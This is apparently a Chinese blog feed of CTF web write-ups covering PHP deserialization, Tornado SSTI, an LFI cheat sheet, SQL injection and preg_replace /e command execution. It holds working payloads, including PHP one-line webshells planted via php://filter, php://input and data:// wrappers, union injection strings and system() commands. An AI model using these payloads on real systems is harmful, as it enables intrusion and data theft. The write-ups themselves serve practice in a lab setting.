class="built_in">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        include(<span class="variable">$file</span>);  //useless.php</span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>第一步构造满足条件的text，利用data协议将文件流重定向<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/NiZhuanSiWei/NiZhuanSiWei.jpg" alt=""><br>第二步就是要获取useless.php的代码,利用filter伪协议<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo</span><br></pre></td></tr></table></figure><br>解码后为<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public <span class="variable">$file</span>;  </span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__tostring</span></span>()&#123;  </span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="built_in">echo</span> file_get_contents(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="built_in">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>反序列化漏洞利用<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public <span class="variable">$file</span>;  </span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__tostring</span></span>()&#123;  </span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="built_in">echo</span> file_get_contents(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="built_in">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span>=new Flag();</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="string">"flag.php"</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>构造payload<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:<span class="string">"Flag"</span>:1:&#123;s:4:<span class="string">"file"</span>;s:8:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure><br>在源码中拿到flag</p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>服务端模板注入(SSTI)</title>
    <url>/post/7da6ee7b.html</url>
    <content><![CDATA[<h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p>一道关于python模板框架tornado的SSTI漏洞题<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t0.PNG" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t1.PNG" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t2.PNG" alt=""><br>看到渲染函数render，就能反应出这里可能存在SSTI<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t3.PNG" alt=""><br>filename应该就是/fllllllllllllag<br>此时的url为<a href="http://9d100937-275b-4b51-80bc-3a4e384f8d83.node3.buuoj.cn/file?filename=/hints.txt&amp;filehash=fa535effc38df8fb5ea22374d7564814" target="_blank" rel="noopener">http://9d100937-275b-4b51-80bc-3a4e384f8d83.node3.buuoj.cn/file?filename=/hints.txt&amp;filehash=fa535effc38df8fb5ea22374d7564814</a><br>md5(cookie_secret+md5(filename))的结果应该就是filehash的值，接下来就是要拿到cookie_secret的值<br>修改参数filename=/fllllllllllllag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t4.PNG" alt=""><br>有回显，并且参数msg的值就是回显内容，这里可能存在SSTI漏洞，测试了一下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t5.PNG" alt=""><br>返回ORZ,说明存在过滤<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t6.PNG" alt=""><br>测试1和2^3都正确回显，确定此处存在SSTI<br>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了<br>获取cookie_secret的payload:<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t7.PNG" alt=""><br>拿到了cookie_secret,接下来计算hash值md5(cookie_secret+md5(filename))=b3b51a763ef182a4f1066ce08df7b518<br>最终payload:?filename=/fllllllllllllag&amp;filehash=b3b51a763ef182a4f1066ce08df7b518<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t8.PNG" alt=""></p>
<p>SSTI(服务端模板注入)是指服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。</p>
<p>主要框架<br>python：jinja2 mako tornado django<br>PHP：smarty twig<br>java：jade velocity<br>模板类型判断<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_tornado/easy_tornado/t9.jpg" alt=""></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>文件包含漏洞LFI</title>
    <url>/post/de39cf9e.html</url>
    <content><![CDATA[<p>两个重要参数（php.ini文件中）<br>allow_url_fopen<br>allow_url_include<br>包含文件的内容只要符合PHP语法都能被当成php代码进行解析，无关后缀名</p>
<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><h3 id="配合日志文件"><a href="#配合日志文件" class="headerlink" title="配合日志文件"></a>配合日志文件</h3><p>?file=&lt;?php @eval($_POST[‘shell’];)?&gt;<br>这条记录会被记录在日志文件中，但是被url编码了<br>用burpsuite抓包改回去就可以利用了</p>
<h3 id="配合-proc-self-environ文件（Linux系统环境变量文件）"><a href="#配合-proc-self-environ文件（Linux系统环境变量文件）" class="headerlink" title="配合/proc/self/environ文件（Linux系统环境变量文件）"></a>配合/proc/self/environ文件（Linux系统环境变量文件）</h3><p>?file=/proc/self/environ&amp;shell=id<br>用burp抓包后再UA后面追加一句&lt;?php system($_GET[‘shell’];?&gt;</p>
<h3 id="配合session文件"><a href="#配合session文件" class="headerlink" title="配合session文件"></a>配合session文件</h3><h3 id="利用file协议"><a href="#利用file协议" class="headerlink" title="利用file协议"></a>利用file协议</h3><p>?file=file:///路径</p>
<h3 id="利用php-filter协议"><a href="#利用php-filter协议" class="headerlink" title="利用php://filter协议"></a>利用php://filter协议</h3><p>?file=php://filter/read=convert.base64-encode/resource=include.php</p>
<p>base64编码中只包含64个可打印字符(大小写字母、0-9、+、/)，而PHP在解码base64时，遇到不在其中的字符时，会跳过这些字符，仅将合法字符组成一个新的字符串进行解码</p>
<p>假设要$_POST传入txt=&lt;?php @eval($_POST[‘shell’];)?&gt;<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$content</span> = <span class="string">'&lt;?php exit;?&gt;'</span>; </span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">'txt'</span>];   </span><br><span class="line">file_put_contents(<span class="variable">$_POST</span>[<span class="string">'file'</span>],<span class="variable">$content</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>$content在开头增加了exit过程，导致即使成功写入了一句话木马，也执行不了</p>
<h4 id="绕过姿势一"><a href="#绕过姿势一" class="headerlink" title="绕过姿势一"></a>绕过姿势一</h4><p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以增加一个’a’,这样就8个字符了，”phpexita”会被正常解码，而后面传入的一句话的base64内容也会被正常解码。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">payload:txt=aPD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddOyk/Pg==&amp;file=php://filter/write=convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure><br>这里的”aPD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddOyk/Pg==”,其中第一个’a’是额外加入用来破坏&lt;?php exit;?&gt;解码的，”PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddOyk/Pg==”就是要传入的一句话的base64编码结果</p>
<p>因为在将$content写入file文中的时候会进行base64解码，即对phpexitaPD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddOyk/Pg==进行解码，解码后的内容写入file文件中<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">解码后为?^?Z&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'shell'</span>];)?&gt;</span><br></pre></td></tr></table></figure><br>这样exit就失效了,就可以成功利用上传的一句话了</p>
<h4 id="绕过姿势二"><a href="#绕过姿势二" class="headerlink" title="绕过姿势二"></a>绕过姿势二</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">payload:txt=PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddOyk/Pg==&amp;file=php://filter=write=string.strip_tags|convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>
<p>php://filter允许使用多个过滤器(通过管道符连接)，可以先将webshell用base64编码，在调用完成strip_tags后进行base64-decode。”死亡exit”在第一步被去除，而webshell在第二步被还原</p>
<h3 id="利用php-input协议"><a href="#利用php-input协议" class="headerlink" title="利用php://input协议"></a>利用php://input协议</h3><p>主要用来接收post数据，将post请求中的数据作为php代码执行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">payload:php://input</span><br><span class="line">然后以post方法传入&lt;?php fputs(fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>),<span class="string">"&lt;?php eval(\$_POST['shell']);?&gt;"</span>)?&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="利用zip-、bzip-、zlib-协议"><a href="#利用zip-、bzip-、zlib-协议" class="headerlink" title="利用zip://、bzip://、zlib://协议"></a>利用zip://、bzip://、zlib://协议</h3><p>这三个协议在双off的情况下也可以正常使用，都属于压缩流，可以访问压缩文件中的子文件。<br>注意：压缩文件不一定是zip文件,只要是压缩文件就行<br>格式：zip://压缩文件绝对路径#压缩子文件文件名，’#’也可为’%23’</p>
<h3 id="利用phar-协议"><a href="#利用phar-协议" class="headerlink" title="利用phar://协议"></a>利用phar://协议</h3><p>类似于zip协议，但是可以使用相对路径<br>格式：phar://压缩文件绝对或相对路径/压缩文件子文件名</p>
<h3 id="利用data-协议"><a href="#利用data-协议" class="headerlink" title="利用data://协议"></a>利用data://协议</h3><p>将原本的include的文件流重定向到了用户可控的输入流中<br>必须在双off的情况下才能正常使用<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">payload:?file=data://text/plain,&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'shell'</span>]);?&gt;</span><br><span class="line">或者?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOz8+</span><br></pre></td></tr></table></figure></p>
<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>两个参数都要是on,allow_url_include在php5.2后默认为off<br>指定url文件<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/LFI.png" alt=""></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>攻防世界-Web</title>
    <url>/post/22d7fead.html</url>
    <content><![CDATA[<h3 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>
<p>扫目录没结果，index.php也没结果<br>访问index.phps<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"admin"</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="built_in">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">"admin"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>传入的id会先被urldecode解码，解码后等于admin<br>payload:<a href="http://111.198.29.45:43285/index.php?id=%2561dmin" target="_blank" rel="noopener">http://111.198.29.45:43285/index.php?id=%2561dmin</a></p>
<h3 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h3><p>上传upload.php文件，弹出警告框：请选择一个图片文件上传！<br>是js验证，直接关闭js<br>再次上传，发现上传按钮被锁定了<br>控制台执行submit.disabled=false<br>上传成功，用菜刀连接成功</p>
<h3 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h3><p>给了一个新闻搜索框，猜测是SQL注入<br>测试：1’ and 1=2 union select 1,2,3#<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/HackerNews.PNG" alt=""><br>测出注入点为2，3<br>爆数据库名：1’ and 1=2 union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.schemata)#<br>爆出数据库名为i：nformation_schema,news<br>应该在news中<br>爆表名：1’ and 1=2 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())#<br>爆出的表名为：news,secret_table<br>应该在secret_table表中<br>爆字段：1’ and 1=2 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=”secret_table”)#<br>爆出字段：id,fl4g<br>直接爆fl4g字段的值：1’ and 1=2 union select 1,2,(select group_concat(fl4g) from secret_table)#<br>拿到QCTF{sq1_inJec7ion_ezzz}</p>
<h3 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/isc_06_0.PNG" alt=""><br>只有报表中心点击出现页面跳转<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ics_06_1.PNG" alt=""><br>url中传参id,刚开始以为是sql注入，测试了好几次都没测出注入点<br>改了好几次id的值也都没发生变化，猜测是要对id的值进行爆破，直接上bp<br>1-10000开始爆破<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ics_06_2.PNG" alt=""></p>
<h3 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ics_05_0.PNG" alt=""><br>应该是文件包含漏洞<br>利用php伪协议<br>payload:php://filter/read=convert.base64-encode/resource=index.php<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ics_05_1.PNG" alt=""><br>base64解码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$pattern</span>) &amp;&amp; isset(<span class="variable">$replacement</span>) &amp;&amp; isset(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>本地登陆,伪造XFF<br>然后就是preg_replace函数的执行漏洞了<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">功能 ： 函数执行一个正则表达式的搜索和替换</span><br><span class="line"></span><br><span class="line">定义 ： mixed preg_replace ( mixed <span class="variable">$pattern</span> , mixed <span class="variable">$replacement</span> , mixed <span class="variable">$subject</span> [, int <span class="variable">$limit</span> = -1 [, int &amp;<span class="variable">$count</span> ]] )</span><br><span class="line"></span><br><span class="line">搜索 subject 中匹配 pattern 的部分， 如果匹配成功以 replacement 进行替换</span><br></pre></td></tr></table></figure></p>
<h4 id="函数代码执行漏洞"><a href="#函数代码执行漏洞" class="headerlink" title="函数代码执行漏洞"></a>函数代码执行漏洞</h4><p>$pattern 存在 /e 模式修正符，允许代码执行<br>/e 模式修正符，是 preg_replace() 将 $replacement 当做php代码来执行<br>参考文章:<a href="https://www.freebuf.com/column/182130.html" target="_blank" rel="noopener">https://www.freebuf.com/column/182130.html</a></p>
<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>payload:?pat=/file/e&amp;rep=system(“ls”)&amp;sub=file<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ics_05_2.PNG" alt=""><br>flag应该在s3chahahaDir中</p>
<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>”+“号在url中会被解释成空格号，这里用%20也行<br>payload:?pat=/file/e&amp;rep=system(“ls+s3chahahaDir”)&amp;sub=file<br><img src="https://gitee.com/zxfireworks/BlogPic/blob/master/ics_05_3.PNG" alt=""><br>继续打开flag</p>
<h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>payload:?pat=/file/e&amp;rep=system(“ls+s3chahahaDir/flag”)&amp;sub=file<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ics_05_4.PNG" alt=""><br>出现flag.php，直接cat</p>
<h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>payload:?pat=/file/e&amp;rep=system(“cat+s3chahahaDir/flag/flag.php”)&amp;sub=file<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ics_05_5.PNG" alt=""></p>
<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> encode(<span class="variable">$str</span>)&#123;</span><br><span class="line">    <span class="variable">$_o</span>=strrev(<span class="variable">$str</span>);</span><br><span class="line">    // <span class="built_in">echo</span> <span class="variable">$_o</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=0;<span class="variable">$_0</span>&lt;strlen(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable">$_c</span>=substr(<span class="variable">$_o</span>,<span class="variable">$_0</span>,1);</span><br><span class="line">        <span class="variable">$__</span>=ord(<span class="variable">$_c</span>)+1;</span><br><span class="line">        <span class="variable">$_c</span>=chr(<span class="variable">$__</span>);</span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">return</span> str_rot13(strrev(base64_encode(<span class="variable">$_</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">/*</span><br><span class="line">   逆向加密算法，解密<span class="variable">$miwen</span>就是flag</span><br><span class="line">*/</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>密文rot13解码后为：n1mYotDfPRFRVdEYjhDNlZjYld2Y5IjOkdTN3EDNlhzM0gzZiFTZ2MjO4gjf<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">rot13_decode=<span class="string">"n1mYotDfPRFRVdEYjhDNlZjYld2Y5IjOkdTN3EDNlhzM0gzZiFTZ2MjO4gjf"</span></span><br><span class="line">res=rot13_decode[::-1]</span><br><span class="line">base64=base64.b64decode(res.encode(<span class="string">"utf-8"</span>)).decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">def decode(strings):</span><br><span class="line">    now=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(strings)):</span><br><span class="line">        tmp=strings[i]</span><br><span class="line">        tmp_ord=ord(tmp)-1</span><br><span class="line">        tmp_chr=chr(tmp_ord)</span><br><span class="line">        now+=tmp_chr</span><br><span class="line">    flag=now[::-1]</span><br><span class="line">    <span class="built_in">return</span> flag</span><br><span class="line"><span class="built_in">print</span>(decode(base64))</span><br></pre></td></tr></table></figure><br>解密后为:<br>flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}</p>
]]></content>
      <categories>
        <category>CTF-Web-WriteUp</category>
      </categories>
  </entry>
  <entry>
    <title>Bugku-Web</title>
    <url>/post/6f5092d6.html</url>
    <content><![CDATA[<h3 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h3><p>题目提到备份文件，即index.php.bak<br>访问一下，下载下来后<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: 2017/8/6</span><br><span class="line"> * Time: 20:22</span><br><span class="line">*/</span><br><span class="line">include_once <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, 0);</span><br><span class="line"><span class="variable">$str</span> = strstr(<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line"><span class="variable">$str</span> = substr(<span class="variable">$str</span>,1);</span><br><span class="line"><span class="variable">$str</span> = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,<span class="variable">$str</span>);</span><br><span class="line">parse_str(<span class="variable">$str</span>);</span><br><span class="line"><span class="built_in">echo</span> md5(<span class="variable">$key1</span>);</span><br><span class="line"><span class="built_in">echo</span> md5(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$key1</span>) == md5(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>$_SERVER[‘REQUEST_URI’]：取当前的URI,也就是除域名外后面的完整的地址路径;<br>假设当前URL=<a href="http://www.zxfireworks.xyz/example/index.php，则结果为example/index.php">http://www.zxfireworks.xyz/example/index.php，则结果为example/index.php</a><br>strstr(string1,string2)函数：寻找string2在string1中出现的位置，并返回查找到字符串的位置之后的全部字符串。当没有查找到符合的字符串时，strstr函数会返回 FALSE(布尔值);<br>例如：strstr(“Helloworld!”,”wo”),结果为world!<br>substr(string,start,length)函数：返回字符串的一部分;<br>例如：substr(“Helloworld!”,5)，结果为world!;从 start 位置开始获取字符串,length是规定被返回字符串的长度。默认是直到字符串的结尾。<br>parse_str(string $encoded_string,array $result)函数： encoded_string 是 URL 传递入的查询字符串；如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代</p>
<p>因此，需要以get方式传入两个参数：key1和key2;<br>因为key会被过滤，双写绕过;<br>通过php中 == 比较漏洞或者数组绕过正则表达式<br>构造payload:?key1[]=1&amp;key2=2  or  ?kekeyy1[]=abc&amp;kekeyy2[]=123</p>
<h3 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag In the variable ! </span><br><span class="line">&lt;?php  </span><br><span class="line">error_reporting(0);</span><br><span class="line">include <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    <span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,<span class="variable">$args</span>))&#123;</span><br><span class="line">        die(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">"var_dump($<span class="variable">$args</span>);"</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>preg_match()函数中：/^开始, \w表示任意一个单词字符，即[0-9a-zA-Z_] ,+将前面的字符匹配一次或多次，$/结尾<br>var_dump()函数：输出变量的类型与值<br>在eval(“var_dump(<script type="math/tex">args);")中</script>srgs有两个$</p>
<p>$$:可变变量;<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span> = <span class="string">'hello'</span>;</span><br><span class="line">$<span class="variable">$a</span> = <span class="string">'world'</span>;  //在$<span class="variable">$a</span>变量中，后面的<span class="variable">$a</span>是一个变量，即<span class="variable">$a</span>=<span class="string">'hello'</span>,那么$<span class="variable">$a</span>意思就是<span class="variable">$hello</span>,这是一个新变量，即$<span class="variable">$a</span> 等价于 <span class="variable">$hello</span>,把内变量的值作为外部变量的变量名</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$a</span> <span class="variable">$&#123;$a&#125;</span>"</span>;    //hello <span class="variable">$hello</span> 即 hello world</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>因为字母字符被过滤，考虑超全局变量$GLOBALS<br>此处可通过var_dump()函数将$GLOBALS数组中存放的所有变量以数组的方式输出<br>构造payload:?args=GLOBALS<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array(7) &#123; [<span class="string">"GLOBALS"</span>]=&gt; *RECURSION* [<span class="string">"_POST"</span>]=&gt; array(0) &#123; &#125; [<span class="string">"_GET"</span>]=&gt; array(1) &#123; [<span class="string">"args"</span>]=&gt; string(7) <span class="string">"GLOBALS"</span> &#125; [<span class="string">"_COOKIE"</span>]=&gt; array(0) &#123; &#125; [<span class="string">"_FILES"</span>]=&gt; array(0) &#123; &#125; [<span class="string">"ZFkwe3"</span>]=&gt; string(38) <span class="string">"flag&#123;92853051ab894a64f7865cf3c2128b34&#125;"</span> [<span class="string">"args"</span>]=&gt; string(7) <span class="string">"GLOBALS"</span> &#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>要求把 flag.baidu.com 解析到123.206.87.240<br>修改HOST(负责域名快速解析的文件)<br>添加123.206.87.240        flag.baidu.com</p>
